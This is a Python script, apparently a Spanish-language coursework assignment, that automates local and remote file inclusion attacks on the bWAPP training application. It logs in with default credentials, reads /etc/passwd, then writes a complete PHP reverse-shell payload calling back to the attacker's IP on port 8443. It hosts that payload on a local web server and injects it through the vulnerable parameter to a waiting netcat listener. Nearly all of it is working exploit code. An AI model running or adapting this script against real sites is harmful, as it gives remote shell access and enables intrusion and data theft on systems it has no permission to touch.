##Tarea 7
##Automatización de LFI / RFI, primero verificando si se puede explotar la lectura del archivo de sistema /etc/passwd y posteriormente levantando un servidor web que, mediante una webshell en php, llama a una shell reversa a la escucha.
##Requisitos: ejecutar en terminal: $nc -nlvp 8443 
##uso: python tarea7aacunaa.py --ip IP

import requests
import urllib
import argparse
import re
from bs4 import BeautifulSoup
import os
import http.server
import socketserver
import daemon
import multiprocessing
import subprocess
import socket


user = "bee"
password = "bug"

##Función que realiza una conexión al sitio vulnerable de acuerdo a la IP, usuario y password.
##Se reconoce si las credenciales son correctas de acuerdo al mensaje de respuesta recibido. 
##Se agrega control de errores.
def Autenticacion(ip, user, password):
    s = requests.Session()
    data = {"login":user, "password": password, "security_level":"0","form":"submit"}
    urlLogin = f"http://{ip}/bWAPP/login.php"
    try:
        req = s.post(urlLogin, data=data, allow_redirects=True)
        #print(req.text)
    except Exception as e:
        print(f"Error al conectar con el host: {e}")
        exit()
    #validar mediante un mensaje de la respuesta que la autenticación fue exitosa
    print('Probando credenciales: '+user +':' +password)
    if "or a buggy web application" in req.text:
        print("¡¡¡¡¡¡¡¡Ingreso exitoso!!!!!!!!")
        # explotación de Local File Inclusion al extraer el archivo /etc/passwd del servicio
        lfi(s,ip)
        # explotación de Remote File Inclusion al crear una web shell en php que llama 
        rfi(s,ip)
    elif "Invalid credentials or user not activated" in req.text:
        print("Invalid credentials")
    else:
        print("Hubo un problema")

##Función que genera un servidor web local en segundo plano en el directorio actual
def start_server(ip_address, port):
    # Crear un manejador de solicitudes HTTP
    handler = http.server.SimpleHTTPRequestHandler

    # Crear un servidor web en la dirección IP y el puerto especificados
    httpd = socketserver.TCPServer((ip_address, port), handler)

    # Imprimir la dirección IP y el puerto del servidor
    print("Servidor web activo en la dirección IP: {}, puerto: {}".format(ip_address, port))

    # Configurar el servidor web como un demonio
    with daemon.DaemonContext():
        # Iniciar el servidor web
        httpd.serve_forever()

##LFI
##realiza la laectura del archivo '/etc/passwd' y valida que exista en la respuesta html. 
def lfi(s,ip):
    # Define el archivo a extraer
    filepath = "/etc/passwd"
    url = f"http://{ip}/bWAPP/rlfi.php?language={urllib.parse.quote_plus(filepath)}&action=go"
    cookie = {'PHPSESSID':'3da1421e81dab8f121b927eee7a6e570', 'security_level':'0'}
    try:
        r = s.get(url, cookies=cookie, timeout=5)
        r.raise_for_status()
    except requests.exceptions.RequestException as e:
        print("Error al conectar con el servidor:", e)
        return False
    
    # Analiza el contenido de la respuesta usando BeautifulSoup
    soup = BeautifulSoup(r.content, 'html.parser')

    # busca el string utilizando una expresión regular
    #regex = r"^[a-z_][a-z0-9_-]*[a-z0-9_$-]?:[^:]*:\d+:\d+:[^:]*:[^:]*:[^:]*$"
    #etcpasswd = re.findall(regex, str(soup))

    if "root:x:0:0:root:/root:" in str(soup):
        print("[+] - LFI /etc/passwd encontrado! - [+]")
        print(soup)
    else:
        print("No se pudo encontrar /etc/passwd")
        return False

def start_server(port=9091):
    while True:
        try:
            handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("", port), handler) as httpd:
                print(f"Servidor iniciado en el puerto {port}")
                httpd.serve_forever()
        except socket.error as e:
            if e.errno == socket.errno.EADDRINUSE:
                print(f"Puerto {port} ya en uso, terminando script")
                exit()
            else:
                raise e

def reverseshell():
    output = subprocess.run(["nc", "-nlvp",":8443"])        

def rfi(s,ip):
    # define y crea shell.php como webshell a explotar
    shellname = "shell.php"

    # Obtener la dirección IP del servidor a crear
    ip_webshell = os.popen('ip addr show | grep inet | awk \'{print $2}\' | cut -d/ -f1').read()
    #print(ip)

    # Filtrar direcciones IP que comiencen con "192"
    ip_pattern = re.compile(r'192\.\d{1,3}\.\d{1,3}\.\d{1,3}')
    ip_addresses = ip_pattern.findall(ip_webshell)

    # Imprimir las direcciones IP que cumplen con el patrón
    for ip_address in ip_addresses:
        print(ip_address)

        # Definir el puerto del servidor
        port = 9091

        ##crea shell.php basado en la ip local del atacante al puerto 8443    
        with open(shellname, "w") as f:
            f.write("<?php set_time_limit(0);$VERSION=\"1.0\";$ip='"+ip_address+"';$port=8443;$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){printit(\"ERROR: Can't fork\");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit(\"Error: Can't setsid()\");exit(1);}$daemon=1;}else{printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}chdir(\"/\");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit(\"$errstr ($errno)\");exit(1);}$descriptorspec=array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit(\"ERROR: Can't spawn shell\");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit(\"Successfully opened reverse shell to $ip:$port\");while(1){if(feof($sock)){printit(\"ERROR: Shell connection terminated\");break;}if(feof($pipes[1])){printit(\"ERROR: Shell process terminated\");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug)printit(\"SOCK READ\");$input=fread($sock,$chunk_size);if($debug)printit(\"SOCK: $input\");fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){if($debug)printit(\"STDOUT READ\");$input=fread($pipes[1],$chunk_size);if($debug)printit(\"STDOUT: $input\");fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){if($debug)printit(\"STDERR READ\");$input=fread($pipes[2],$chunk_size);if($debug)printit(\"STDERR: $input\");fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print\"$string\n\";}} ?>")

        # Configurar el servidor web como un demonio
        server_process = multiprocessing.Process(target=start_server)
        # Iniciar proceso secundario en segundo plano
        server_process.start()
        print("Servidor en segundo plano")

        #Realiza la inyección a la URL invocando la webshell creada en el servidor web
        url = f"http://"+ip+"/bWAPP/rlfi.php?language=http://"+ip_address+":"+str(port)+"/"+shellname+"&action=go"
        print(url)
        cookie = {'PHPSESSID':'3da1421e81dab8f121b927eee7a6e570', 'security_level':'0'}
        try:
            r = s.get(url, cookies=cookie, timeout=5)
            r.raise_for_status() # Verifica si la solicitud fue exitosa
        except requests.exceptions.RequestException as e:
            print("Error al conectar con el servidor:", e)
            server_process.terminate()
            return False
    

##En la función principal se controlan los argumentos recibidos y se hace la Autenticación de acuerdo al usuario y contraseña configurado.
def main():
    parser = argparse.ArgumentParser(description='LFI/RFI en bWAPP')
    parser.add_argument('--ip', metavar='IP', type=str, required=True, help='La dirección IP del servidor')
    args = parser.parse_args()

    print("[+] - Iniciando")
    Autenticacion(args.ip, user, password)
    print("[+] - Finalizado")
if __name__ == "__main__":
    main()
